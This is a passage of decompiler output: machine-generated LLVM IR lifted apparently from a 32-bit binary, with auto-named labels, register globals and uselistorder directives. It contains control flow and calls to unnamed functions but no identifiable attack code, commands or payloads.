dec_label_pc_1000b154:                            ; preds = %dec_label_pc_1000b100, %dec_label_pc_1000b0f8
  %v0_1000b154 = call i32 @function_10009ac8()
  br label %dec_label_pc_1000b188

dec_label_pc_1000b160:                            ; preds = %dec_label_pc_1000b0ec
  br i1 %v3_1000b160, label %dec_label_pc_1000b168, label %dec_label_pc_1000b350

dec_label_pc_1000b168:                            ; preds = %dec_label_pc_1000b160
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %tmp58, label %dec_label_pc_1000b180, label %dec_label_pc_1000b174

dec_label_pc_1000b174:                            ; preds = %dec_label_pc_1000b168
  store i32 12, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 12, i32* @r4, align 4
  %v0_1000b1a010 = load i32, i32* @r30, align 4
  store i32 %v0_1000b1a010, i32* @r3, align 4
  store i32 1, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000b190

dec_label_pc_1000b180:                            ; preds = %dec_label_pc_1000b168
  %v0_1000b180 = call i32 @function_10009ac8()
  br label %dec_label_pc_1000b188

dec_label_pc_1000b188:                            ; preds = %dec_label_pc_1000b154, %dec_label_pc_1000b180
  %storemerge3 = phi i32 [ %v0_1000b180, %dec_label_pc_1000b180 ], [ %v0_1000b154, %dec_label_pc_1000b154 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_1000b180 ], [ 1, %dec_label_pc_1000b154 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_1000b188 = inttoptr i32 %storemerge3 to i32*
  store i32 %storemerge, i32* %v2_1000b188, align 4
  br label %dec_label_pc_1000b3ec

dec_label_pc_1000b190:                            ; preds = %dec_label_pc_1000b174, %dec_label_pc_1000b190
  %v0_1000b1a014 = phi i32 [ %v0_1000b1a010, %dec_label_pc_1000b174 ], [ %v0_1000b1a0, %dec_label_pc_1000b190 ]
  %storemerge213 = phi i32 [ 12, %dec_label_pc_1000b174 ], [ %v2_1000b194, %dec_label_pc_1000b190 ]
  store i32 268480916, i32* @lr, align 4
  %v2_1000b190 = call i32 @function_1000ca48(i32 %v0_1000b1a014, i32 %storemerge213)
  %v0_1000b194 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000b194 = add i32 %v0_1000b194, %v2_1000b190
  %v0_1000b1a4.pr = load i32, i32* %r29.global-to-local, align 4
  store i32 %v2_1000b194, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_1000b194, i32* @r4, align 4
  %v0_1000b1a0 = load i32, i32* @r30, align 4
  store i32 %v0_1000b1a0, i32* @r3, align 4
  %v2_1000b1a4 = icmp slt i32 %v0_1000b1a4.pr, 1
  %v1_1000b1a8 = add i32 %v0_1000b1a4.pr, 1
  store i32 %v1_1000b1a8, i32* %r29.global-to-local, align 4
  br i1 %v2_1000b1a4, label %dec_label_pc_1000b190, label %dec_label_pc_1000b1b0

dec_label_pc_1000b1b0:                            ; preds = %dec_label_pc_1000b190
  store i32 0, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %v2_1000b16c, label %dec_label_pc_1000b2fc, label %dec_label_pc_1000b304

dec_label_pc_1000b1c0:                            ; preds = %dec_label_pc_1000b2fc
  store i32 %v2_1000b1c0, i32* %r29.global-to-local, align 4
  %v0_1000b1c4 = load i32, i32* @r30, align 4
  store i32 268480984, i32* @lr, align 4
  %v5_1000b1d4 = call i32 @function_1000ca74(i32 %v0_1000b1c4, i32 %v0_1000b1c8, i32 %v1_1000b2fc, i32* nonnull %stack_var_-184)
  store i32 %v5_1000b1d4, i32* %r15.global-to-local, align 4
  %tmp64 = icmp sgt i32 %v5_1000b1d4, -1
  br i1 %tmp64, label %dec_label_pc_1000b1f8, label %dec_label_pc_1000b1e0

dec_label_pc_1000b1e0:                            ; preds = %dec_label_pc_1000b1c0
  %v0_1000b1e0 = load i32, i32* @r24, align 4
  %v3_1000b1e0 = icmp eq i32 %v0_1000b1e0, 0
  br i1 %v3_1000b1e0, label %dec_label_pc_1000b350, label %dec_label_pc_1000b1e8

dec_label_pc_1000b1e8:                            ; preds = %dec_label_pc_1000b1e0
  store i32 %tmp33, i32* %r0.global-to-local, align 4
  br i1 %v3_1000b1ec, label %dec_label_pc_1000b350, label %dec_label_pc_1000b304

dec_label_pc_1000b1f8:                            ; preds = %dec_label_pc_1000b1c0
  store i32 %stack_var_-88.118, i32* %r0.global-to-local, align 4
  %v3_1000b1fc = icmp eq i32 %stack_var_-88.118, 0
  br i1 %v3_1000b1fc, label %dec_label_pc_1000b2a0, label %dec_label_pc_1000b204

dec_label_pc_1000b204:                            ; preds = %dec_label_pc_1000b1f8
  %v0_1000b204 = load i32, i32* @r31, align 4
  store i32 %v2_1000b1c0, i32* @r4, align 4
  %v1_1000b20c = add i32 %v0_1000b204, 28
  %v2_1000b20c = inttoptr i32 %v1_1000b20c to i32*
  %v3_1000b20c = load i32, i32* %v2_1000b20c, align 4
  store i32 %v3_1000b20c, i32* %r0.global-to-local, align 4
  store i32 %v0_1000b204, i32* @r3, align 4
  %v1_1000b214 = add i32 %v0_1000b204, 36
  %v2_1000b214 = inttoptr i32 %v1_1000b214 to i32*
  %v3_1000b214 = load i32, i32* %v2_1000b214, align 4
  store i32 %v3_1000b214, i32* %r11.global-to-local, align 4
  store i32 40, i32* @r5, align 4
  store i32 268481068, i32* @lr, align 4
  %v0_1000b228 = call i32 @function_10007104()
  %v0_1000b22c = load i32, i32* @r31, align 4
  %v1_1000b22c = add i32 %v0_1000b22c, 4
  %v2_1000b22c = inttoptr i32 %v1_1000b22c to i32*
  %v3_1000b22c = load i32, i32* %v2_1000b22c, align 4
  %v3_1000b230 = icmp eq i32 %v3_1000b22c, 24
  br i1 %v3_1000b230, label %dec_label_pc_1000b204.dec_label_pc_1000b254_crit_edge, label %dec_label_pc_1000b238

dec_label_pc_1000b204.dec_label_pc_1000b254_crit_edge: ; preds = %dec_label_pc_1000b204
  %v1_1000b254.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_1000b254

dec_label_pc_1000b238:                            ; preds = %dec_label_pc_1000b204
  %v1_1000b238 = add i32 %v0_1000b22c, 28
  %v2_1000b238 = inttoptr i32 %v1_1000b238 to i32*
  %v3_1000b238 = load i32, i32* %v2_1000b238, align 4
  store i32 %v3_1000b238, i32* %r0.global-to-local, align 4
  %v3_1000b23c = icmp eq i32 %v3_1000b238, 0
  br i1 %v3_1000b23c, label %dec_label_pc_1000b304, label %dec_label_pc_1000b244

dec_label_pc_1000b244:                            ; preds = %dec_label_pc_1000b238
  %v0_1000b244 = load i32, i32* %r16.global-to-local, align 4
  %v3_1000b244 = icmp eq i32 %v0_1000b244, 1
  br i1 %v3_1000b244, label %dec_label_pc_1000b254, label %dec_label_pc_1000b24c

dec_label_pc_1000b24c:                            ; preds = %dec_label_pc_1000b244
  %v3_1000b24c = icmp eq i32 %v0_1000b244, 28
  br i1 %v3_1000b24c, label %dec_label_pc_1000b254, label %dec_label_pc_1000b304

dec_label_pc_1000b254:                            ; preds = %dec_label_pc_1000b204.dec_label_pc_1000b254_crit_edge, %dec_label_pc_1000b24c, %dec_label_pc_1000b244
  %v1_1000b254 = phi i32 [ %v1_1000b254.pre, %dec_label_pc_1000b204.dec_label_pc_1000b254_crit_edge ], [ 28, %dec_label_pc_1000b24c ], [ 1, %dec_label_pc_1000b244 ]
  %v4_1000b254 = icmp eq i32 %v3_1000b22c, %v1_1000b254
  br i1 %v4_1000b254, label %dec_label_pc_1000b268, label %dec_label_pc_1000b25c

dec_label_pc_1000b25c:                            ; preds = %dec_label_pc_1000b254
  %v1_1000b25c = inttoptr i32 %v0_1000b22c to i32*
  %v2_1000b25c = load i32, i32* %v1_1000b25c, align 4
  store i32 %v2_1000b25c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000b264.320 to i32), i32* @lr, align 4
  %v0_1000b260 = call i32 @function_100081f4()
  br label %dec_label_pc_1000b2e8

dec_label_pc_1000b268:                            ; preds = %dec_label_pc_1000b254
  %v1_1000b26c = add i32 %v0_1000b22c, 16
  %v2_1000b26c = inttoptr i32 %v1_1000b26c to i32*
  %v3_1000b26c = load i32, i32* %v2_1000b26c, align 4
  store i32 %v3_1000b26c, i32* %r11.global-to-local, align 4
  %v1_1000b270 = add i32 %v0_1000b22c, 32
  %v2_1000b270 = inttoptr i32 %v1_1000b270 to i32*
  %v3_1000b270 = load i32, i32* %v2_1000b270, align 4
  store i32 %v3_1000b270, i32* %r0.global-to-local, align 4
  %v0_1000b274 = load i32, i32* @r24, align 4
  %v2_1000b274 = sub i32 %tmp35, %v0_1000b274
  %v1_1000b278 = add i32 %v2_1000b274, -1
  %v1_1000b27c = add i32 %v3_1000b26c, 4
  %v2_1000b280 = mul i32 %v1_1000b278, %v1_1000b27c
  store i32 %v2_1000b280, i32* %r11.global-to-local, align 4
  %v2_1000b284 = add i32 %v0_1000b22c, 36
  %v3_1000b284 = inttoptr i32 %v2_1000b284 to i32*
  store i32 %v1_1000b278, i32* %v3_1000b284, align 4
  %v0_1000b288 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b288 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000b288 = icmp ugt i32 %v0_1000b288, %v1_1000b288
  br i1 %v3_1000b288, label %dec_label_pc_1000b304, label %dec_label_pc_1000b290

dec_label_pc_1000b290:                            ; preds = %dec_label_pc_1000b268
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000b298 = load i32, i32* @r31, align 4
  %v2_1000b298 = add i32 %v1_1000b298, 36
  %v3_1000b298 = inttoptr i32 %v2_1000b298 to i32*
  store i32 0, i32* %v3_1000b298, align 4
  br label %dec_label_pc_1000b2e8

dec_label_pc_1000b2a0:                            ; preds = %dec_label_pc_1000b1f8
  %v3_1000b2a0 = load i32, i32* %stack_var_-184, align 4
  store i32 %v3_1000b2a0, i32* @r3, align 4
  store i32 268481192, i32* @lr, align 4
  %v0_1000b2a4 = call i32 @function_100081f4()
  store i32 %tmp29, i32* %r0.global-to-local, align 4
  %v1_1000b2ac = load i32, i32* %r16.global-to-local, align 4
  %v4_1000b2ac = icmp eq i32 %tmp29, %v1_1000b2ac
  br i1 %v4_1000b2ac, label %dec_label_pc_1000b2b4, label %dec_label_pc_1000b2e8

dec_label_pc_1000b2b4:                            ; preds = %dec_label_pc_1000b2a0
  %v0_1000b2b4 = load i32, i32* @r31, align 4
  %v1_1000b2b4 = add i32 %v0_1000b2b4, 16
  %v2_1000b2b4 = inttoptr i32 %v1_1000b2b4 to i32*
  %v3_1000b2b4 = load i32, i32* %v2_1000b2b4, align 4
  store i32 %v3_1000b2b4, i32* @r5, align 4
  store i32 %tmp28, i32* %r0.global-to-local, align 4
  %v4_1000b2bc = icmp eq i32 %v3_1000b2b4, %tmp28
  br i1 %v4_1000b2bc, label %dec_label_pc_1000b2c4, label %dec_label_pc_1000b348

dec_label_pc_1000b2c4:                            ; preds = %dec_label_pc_1000b2b4
  %v1_1000b2c4 = add i32 %v0_1000b2b4, 36
  %v2_1000b2c4 = inttoptr i32 %v1_1000b2c4 to i32*
  %v3_1000b2c4 = load i32, i32* %v2_1000b2c4, align 4
  %v1_1000b2c8 = add i32 %v0_1000b2b4, 28
  %v2_1000b2c8 = inttoptr i32 %v1_1000b2c8 to i32*
  %v3_1000b2c8 = load i32, i32* %v2_1000b2c8, align 4
  store i32 %v3_1000b2c8, i32* %r0.global-to-local, align 4
  %v2_1000b2d0 = mul i32 %v3_1000b2c4, %tmp28
  %v2_1000b2d4 = add i32 %v3_1000b2c8, %v2_1000b2d0
  store i32 %v2_1000b2d4, i32* @r3, align 4
  store i32 268481244, i32* @lr, align 4
  %v0_1000b2d8 = call i32 @function_10007104()
  %v0_1000b2dc = load i32, i32* @r31, align 4
  %v1_1000b2dc = add i32 %v0_1000b2dc, 36
  %v2_1000b2dc = inttoptr i32 %v1_1000b2dc to i32*
  %v3_1000b2dc = load i32, i32* %v2_1000b2dc, align 4
  %v1_1000b2e0 = add i32 %v3_1000b2dc, 1
  store i32 %v1_1000b2e0, i32* %v2_1000b2dc, align 4
  br label %dec_label_pc_1000b2e8

dec_label_pc_1000b2e8:                            ; preds = %dec_label_pc_1000b2a0, %dec_label_pc_1000b290, %dec_label_pc_1000b25c, %dec_label_pc_1000b2c4
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_1000b2c4 ], [ 0, %dec_label_pc_1000b2a0 ], [ 0, %dec_label_pc_1000b290 ], [ %stack_var_-88.118, %dec_label_pc_1000b25c ]
  %v0_1000b2e8 = load i32, i32* @r28, align 4
  %v1_1000b2e8 = load i32, i32* %r15.global-to-local, align 4
  %v2_1000b2e8 = add i32 %v1_1000b2e8, %v0_1000b2e8
  store i32 %v2_1000b2e8, i32* %r28.global-to-local, align 4
  %v0_1000b2ec = load i32, i32* @r24, align 4
  %v1_1000b2ec = add i32 %v0_1000b2ec, 1
  store i32 %v1_1000b2ec, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  %v2_1000b2f4 = icmp slt i32 %v1_1000b2ec, %tmp35
  br i1 %v2_1000b2f4, label %dec_label_pc_1000b2fc, label %dec_label_pc_1000b304

dec_label_pc_1000b2fc:                            ; preds = %dec_label_pc_1000b1b0, %dec_label_pc_1000b2e8
  %v0_1000b1c8 = phi i32 [ %v2_1000b2e8, %dec_label_pc_1000b2e8 ], [ %v2_1000b194, %dec_label_pc_1000b1b0 ]
  %stack_var_-88.118 = phi i32 [ %stack_var_-88.0, %dec_label_pc_1000b2e8 ], [ 1, %dec_label_pc_1000b1b0 ]
  %v1_1000b2fc = load i32, i32* @r27, align 4
  %v2_1000b2fc = icmp slt i32 %v0_1000b1c8, %v1_1000b2fc
  br i1 %v2_1000b2fc, label %dec_label_pc_1000b1c0, label %dec_label_pc_1000b304

dec_label_pc_1000b304:                            ; preds = %dec_label_pc_1000b1e8, %dec_label_pc_1000b1b0, %dec_label_pc_1000b2fc, %dec_label_pc_1000b238, %dec_label_pc_1000b268, %dec_label_pc_1000b2e8, %dec_label_pc_1000b24c
  %v0_1000b304 = load i32, i32* @r19, align 4
  store i32 268481292, i32* @lr, align 4
  %v1_1000b308 = call i32 @function_10004ab4(i32 %v0_1000b304)
  %v3_1000b310 = icmp eq i32 %arg5, 0
  %v0_1000b320 = load i32, i32* @r30, align 4
  br i1 %v3_1000b310, label %dec_label_pc_1000b320, label %dec_label_pc_1000b318

dec_label_pc_1000b318:                            ; preds = %dec_label_pc_1000b304
  %v2_1000b318 = inttoptr i32 %arg5 to i32*
  store i32 %v0_1000b320, i32* %v2_1000b318, align 4
  br label %dec_label_pc_1000b328

dec_label_pc_1000b320:                            ; preds = %dec_label_pc_1000b304
  store i32 %v0_1000b320, i32* @r3, align 4
  store i32 268481320, i32* @lr, align 4
  %v0_1000b324 = call i32 @function_100081f4()
  br label %dec_label_pc_1000b328

dec_label_pc_1000b328:                            ; preds = %dec_label_pc_1000b318, %dec_label_pc_1000b320
  %v0_1000b328 = load i32, i32* @r21, align 4
  store i32 %v0_1000b328, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r29.global-to-local, align 4
  store i32 268481332, i32* @lr, align 4
  %v0_1000b330 = call i32 @function_100081f4()
  store i32 ptrtoint (i32* @global_var_10012b0c.308 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000b42c

dec_label_pc_1000b348:                            ; preds = %dec_label_pc_1000b2b4
  %v1_1000b348 = inttoptr i32 %v0_1000b2b4 to i32*
  %v2_1000b348 = load i32, i32* %v1_1000b348, align 4
  store i32 %v2_1000b348, i32* @r3, align 4
  store i32 268481360, i32* @lr, align 4
  %v0_1000b34c = call i32 @function_100081f4()
  br label %dec_label_pc_1000b350

dec_label_pc_1000b350:                            ; preds = %dec_label_pc_1000b160, %dec_label_pc_1000b0c8, %dec_label_pc_1000b1e8, %dec_label_pc_1000b1e0, %dec_label_pc_1000b0e0, %dec_label_pc_1000b0a8, %dec_label_pc_1000b348
  %v0_1000b350 = load i32, i32* %r17.global-to-local, align 4
  %v3_1000b350 = icmp eq i32 %v0_1000b350, 0
  br i1 %v3_1000b350, label %dec_label_pc_1000b358, label %dec_label_pc_1000b3a8

dec_label_pc_1000b358:                            ; preds = %dec_label_pc_1000b350
  store i32 ptrtoint (i32* @global_var_100103e0.262 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_1000ae5c, i32* %r28.global-to-local, align 4
  store i32 %v2_1000ae5c, i32* @r3, align 4
  %v0_1000b374 = call i32 @function_100091fc()
  %v0_1000b37c = call i32 @function_100091f4()
  %v3_1000b384 = load i32, i32* @global_var_100104cc.312, align 4
  store i32 %v3_1000b384, i32* %r29.global-to-local, align 4
  store i32 %v2_1000ae5c, i32* @r3, align 4
  %v0_1000b390 = call i32 @function_100091fc()
  %v0_1000b394 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000b394 = add i32 %v0_1000b394, -1
  store i32 %v1_1000b394, i32* %r29.global-to-local, align 4
  %v0_1000b398 = load i32, i32* @r22, align 4
  %v2_1000b398 = icmp slt i32 %v0_1000b398, %v1_1000b394
  br i1 %v2_1000b398, label %dec_label_pc_1000b3a0, label %dec_label_pc_1000b3a8

dec_label_pc_1000b3a0:                            ; preds = %dec_label_pc_1000b358
  %v1_1000b3a0 = add i32 %v0_1000b398, 1
  store i32 %v1_1000b3a0, i32* @r22, align 4
  br label %dec_label_pc_1000b3c4thread-pre-split.backedge

dec_label_pc_1000b3c4thread-pre-split.backedge:   ; preds = %dec_label_pc_1000b3a0, %dec_label_pc_1000b148, %dec_label_pc_1000b3c0
  %v0_1000b3c4.pr = load i32, i32* %r18.global-to-local, align 4
  %tmp65 = icmp ult i32 %v0_1000b3c4.pr, 3
  br i1 %tmp65, label %dec_label_pc_1000aeb8.lr.ph, label %dec_label_pc_1000b3dc

dec_label_pc_1000b3a8:                            ; preds = %dec_label_pc_1000b058, %dec_label_pc_1000b358, %dec_label_pc_1000b350, %dec_label_pc_1000b070
  %v0_1000b3a8 = load i32, i32* @r26, align 4
  %v1_1000b3a8 = add i32 %v0_1000b3a8, 1
  store i32 %v1_1000b3a8, i32* %r0.global-to-local, align 4
  %v1_1000b3ac = load i32, i32* @r23, align 4
  %v2_1000b3ac = srem i32 %v1_1000b3a8, %v1_1000b3ac
  store i32 %v2_1000b3ac, i32* @r26, align 4
  %v5_1000b3b4 = icmp eq i32 %v2_1000b3ac, 0
  br i1 %v5_1000b3b4, label %dec_label_pc_1000b3bc, label %dec_label_pc_1000b3c0

dec_label_pc_1000b3bc:                            ; preds = %dec_label_pc_1000b3a8
  %v0_1000b3bc = load i32, i32* %r18.global-to-local, align 4
  %v1_1000b3bc = add i32 %v0_1000b3bc, 1
  store i32 %v1_1000b3bc, i32* %r18.global-to-local, align 4
  br label %dec_label_pc_1000b3c0

dec_label_pc_1000b3c0:                            ; preds = %dec_label_pc_1000b3a8, %dec_label_pc_1000b3bc
  store i32 -1, i32* @r22, align 4
  br label %dec_label_pc_1000b3c4thread-pre-split.backedge

dec_label_pc_1000aeb8.lr.ph:                      ; preds = %dec_label_pc_1000aeb8.lr.ph.lr.ph, %dec_label_pc_1000b3c4thread-pre-split.backedge
  br label %dec_label_pc_1000aeb8

dec_label_pc_1000b3d0:                            ; preds = %dec_label_pc_1000ae30, %dec_label_pc_1000ae28, %dec_label_pc_1000ae20, %dec_label_pc_1000add8
  store i32 -1, i32* @r19, align 4
  store i32 -1, i32* @r26, align 4
  store i32 -1, i32* @r25, align 4
  br label %dec_label_pc_1000b3dc

dec_label_pc_1000b3dc:                            ; preds = %dec_label_pc_1000b3c4thread-pre-split.backedge, %dec_label_pc_1000aec8, %dec_label_pc_1000afa4, %dec_label_pc_1000b068, %dec_label_pc_1000ae3c, %dec_label_pc_1000b3d0
  %v0_1000b3dc = call i32 @function_10009ac8()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1000b3e4 = inttoptr i32 %v0_1000b3dc to i32*
  store i32 -1, i32* %v2_1000b3e4, align 4
  %v0_1000b3e8 = load i32, i32* @r25, align 4
  store i32 %v0_1000b3e8, i32* @r20, align 4
  br label %dec_label_pc_1000b3ec

dec_label_pc_1000b3ec:                            ; preds = %dec_label_pc_1000b188, %dec_label_pc_1000b3dc
  %v0_1000b3ec = load i32, i32* @r19, align 4
  %v3_1000b3ec = icmp eq i32 %v0_1000b3ec, -1
  br i1 %v3_1000b3ec, label %dec_label_pc_1000b3fc, label %dec_label_pc_1000b3f4

dec_label_pc_1000b3f4:                            ; preds = %dec_label_pc_1000b3ec
  store i32 268481532, i32* @lr, align 4
  %v1_1000b3f8 = call i32 @function_10004ab4(i32 %v0_1000b3ec)
  br label %dec_label_pc_1000b3fc

dec_label_pc_1000b3fc:                            ; preds = %dec_label_pc_1000b3ec, %dec_label_pc_1000b3f4
  %v0_1000b3fc = load i32, i32* @r21, align 4
  store i32 %v0_1000b3fc, i32* @r3, align 4
  store i32 -1, i32* @r27, align 4
  store i32 268481544, i32* @lr, align 4
  %v0_1000b404 = call i32 @function_100081f4()
  %v0_1000b408 = load i32, i32* @r30, align 4
  store i32 %v0_1000b408, i32* @r3, align 4
  store i32 268481552, i32* @lr, align 4
  %v0_1000b40c = call i32 @function_100081f4()
  %v0_1000b410 = load i32, i32* @r26, align 4
  %v3_1000b410 = icmp eq i32 %v0_1000b410, -1
  br i1 %v3_1000b410, label %dec_label_pc_1000b45c, label %dec_label_pc_1000b418

dec_label_pc_1000b418:                            ; preds = %dec_label_pc_1000b3fc
  store i32 ptrtoint (i32* @global_var_10012b0c.308 to i32), i32* %r29.global-to-local, align 4
  %v2_1000b424 = ptrtoint i32* %stack_var_-228 to i32
  br label %dec_label_pc_1000b42c

dec_label_pc_1000b42c:                            ; preds = %dec_label_pc_1000b328, %dec_label_pc_1000b418
  %storemerge68 = phi i32 [ %v2_1000b424, %dec_label_pc_1000b418 ], [ %v2_1000ae5c, %dec_label_pc_1000b328 ]
  %v1_1000b430.pre-phi = phi i32 [ %v2_1000b424, %dec_label_pc_1000b418 ], [ %v2_1000ae5c, %dec_label_pc_1000b328 ]
  store i32 %storemerge68, i32* %r28.global-to-local, align 4
  store i32 %v1_1000b430.pre-phi, i32* @r3, align 4
  %v0_1000b434 = call i32 @function_100091fc()
  %v0_1000b43c = call i32 @function_100091f4()
  %v0_1000b444 = load i32, i32* @r26, align 4
  store i32 %v0_1000b444, i32* @global_var_100104c4.309, align 4
  store i32 %v1_1000b430.pre-phi, i32* @r3, align 4
  %v0_1000b454 = load i32, i32* @r20, align 4
  %v1_1000b454 = trunc i32 %v0_1000b454 to i16
  store i16 %v1_1000b454, i16* @global_var_100103dc.310, align 2
  %v0_1000b458 = call i32 @function_100091fc()
  br label %dec_label_pc_1000b45c

dec_label_pc_1000b45c:                            ; preds = %dec_label_pc_1000b3fc, %dec_label_pc_1000b42c
  store i32 %v0_1000addc, i32* %r0.global-to-local, align 4
  %v0_1000b460 = load i32, i32* @r27, align 4
  ret i32 %v0_1000b460

; uselistorder directives
  uselistorder i32 %v1_1000b430.pre-phi, { 1, 0 }
  uselistorder i32 %v2_1000b3ac, { 1, 0 }
  uselistorder i32 %v0_1000b320, { 1, 0 }
  uselistorder i32 %v1_1000b2fc, { 1, 0 }
  uselistorder i32 %stack_var_-88.118, { 1, 0, 2 }
  uselistorder i32 %v0_1000b1c8, { 1, 0 }
  uselistorder i32 %v1_1000b2ec, { 1, 0 }
  uselistorder i32 %v0_1000b2b4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000b278, { 1, 0 }
  uselistorder i32 %v0_1000b22c, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v0_1000b204, { 2, 1, 0 }
  uselistorder i32 %v0_1000b1a0, { 1, 0 }
  uselistorder i32 %v2_1000b194, { 0, 2, 1, 3 }
  uselistorder i32 %v4_1000b0b8, { 1, 0 }
  uselistorder i32 %v1_1000afb8, { 1, 0 }
  uselistorder i32 %v1_1000af8c, { 1, 0 }
  uselistorder i32 %v1_1000af58, { 1, 0 }
  uselistorder i32 %v1_1000aef0, { 1, 0 }
  uselistorder i32 %v2_1000ae5c, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 9, 10, 11, 12 }
  uselistorder i32 %v0_1000ae10, { 1, 0 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2, 3 }
  uselistorder i16* %stack_var_-212, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-184, { 1, 0, 2 }
  uselistorder i32 %tmp36, { 1, 0, 2 }
  uselistorder i32 %tmp35, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp29, { 1, 0 }
  uselistorder i32 %tmp28, { 0, 2, 1 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 19, 20, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r28.global-to-local, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7 }
  uselistorder i32* %r18.global-to-local, { 0, 3, 5, 1, 4, 2, 6 }
  uselistorder i32* %r17.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r16.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 13, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 34, 14, 16, 33, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 (i32, i32, i32, i32)* @function_10007fb4, { 4, 3, 2, 1, 0 }
  uselistorder i32 101, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @function_10007f50, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10008068, { 2, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 17, { 1, 2, 10, 3, 8, 4, 5, 0, 6, 13, 14, 11, 12, 9, 7 }
  uselistorder i32 (i32)* @function_10007b1c, { 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i16 10, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @function_10007414, { 2, 1, 0, 3 }
  uselistorder i32 (i32)* @function_10004ab4, { 6, 5, 4, 13, 12, 11, 10, 9, 8, 1, 15, 14, 7, 0, 3, 2 }
  uselistorder i16* @global_var_100103dc.310, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 1, 4, 0 }
  uselistorder i32 ()* @function_1000809c, { 9, 8, 7, 6, 10, 3, 2, 11, 5, 4, 1, 0 }
  uselistorder i32 512, { 2, 3, 0, 1, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_1000b45c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b42c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b3fc, { 1, 0 }
  uselistorder label %dec_label_pc_1000b3ec, { 1, 0 }
  uselistorder label %dec_label_pc_1000b3dc, { 5, 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_1000aeb8.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1000b3c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000b3a8, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1000b3c4thread-pre-split.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b350, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_1000b328, { 1, 0 }
  uselistorder label %dec_label_pc_1000b304, { 2, 5, 4, 6, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000b2fc, { 1, 0 }
  uselistorder label %dec_label_pc_1000b2e8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000b254, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000b190, { 1, 0 }
  uselistorder label %dec_label_pc_1000b188, { 1, 0 }
  uselistorder label %dec_label_pc_1000b02c, { 1, 0 }
  uselistorder label %dec_label_pc_1000afa4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000aec8, { 1, 0 }
}

define i32 @function_1000b474() local_unnamed_addr {
dec_label_pc_1000b474:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %v2_1000b490 = ptrtoint i32* %stack_var_-200 to i32
  store i32 %v2_1000b490, i32* @r3, align 4
  %v0_1000b49c = call i32 @function_100091fc()
  store i32 ptrtoint (i32* @global_var_100103e0.262 to i32), i32* %r3.global-to-local, align 4
  %v0_1000b4a4 = call i32 @function_100091f4()
  store i32 %v0_1000b4a4, i32* %r3.global-to-local, align 4
  %v3_1000b4ac = load i32, i32* @global_var_100104c8.263, align 4
  %v2_1000b4b0 = icmp sgt i32 %v3_1000b4ac, 0
  br i1 %v2_1000b4b0, label %dec_label_pc_1000b728, label %dec_label_pc_1000b4b8

dec_label_pc_1000b4b8:                            ; preds = %dec_label_pc_1000b474
  store i32 ptrtoint ([17 x i8]* @global_var_1000f8a8.323 to i32), i32* %r3.global-to-local, align 4
  store i32 268481744, i32* @lr, align 4
  %v3_1000b4cc = call i32 @function_10004f90(i32 ptrtoint ([17 x i8]* @global_var_1000f8a8.323 to i32), i32 ptrtoint (i32* @global_var_1000f8bc.322 to i32))
  store i32 %v3_1000b4cc, i32* %r3.global-to-local, align 4
  store i32 %v3_1000b4cc, i32* @r26, align 4
  %v3_1000b4d0 = icmp eq i32 %v3_1000b4cc, 0
